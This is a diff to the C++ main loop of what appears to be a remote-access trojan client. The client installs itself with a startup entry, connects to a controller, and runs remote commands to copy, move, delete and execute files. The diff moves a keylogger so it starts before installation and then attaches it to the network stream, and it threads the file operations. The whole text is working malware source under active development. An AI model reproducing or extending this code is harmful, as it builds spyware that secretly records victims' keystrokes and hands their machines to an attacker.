@@ -19,6 +19,10 @@ int main(int argc = 0, char *argv[] = nullptr) {
     Sleep(argc);
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
+#ifdef KEYLOGGER
+        KeyLogger keyLogger(Stream(0));
+        keyLogger.tryStart();
+#endif
         Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
         bool connectionState = true;
         while (connectionState) {
@@ -43,10 +47,8 @@ int main(int argc = 0, char *argv[] = nullptr) {
                 KeyboardExecuter keyboardExecuter(stream);
                 Permission permission(stream);
                 MessageBoxGUI messageBoxGui(stream);
-
 #ifdef KEYLOGGER
-                KeyLogger keyLogger(stream);
-                keyLogger.tryStart();
+                keyLogger.setStream(stream);
 #endif
                 while (streamListening) {
                     int action = stream.readSize();
@@ -84,19 +86,19 @@ int main(int argc = 0, char *argv[] = nullptr) {
                             break;
                         }
                         case 6: { // copy file or directory
-                            fileManager.copyFiles();
+                            fileManager.copyFilesThread();
                             break;
                         }
                         case 7: { // move file or directory
-                            fileManager.moveFiles();
+                            fileManager.moveFilesThread();
                             break;
                         }
                         case 8: { // delete file or directory
-                            fileManager.deleteFiles();
+                            fileManager.deleteFilesThread();
                             break;
                         }
                         case 9: { // run file or directory
-                            fileManager.runFiles();
+                            fileManager.runFilesThread();
                             break;
                         }
                         case 10: { // upload files to directory
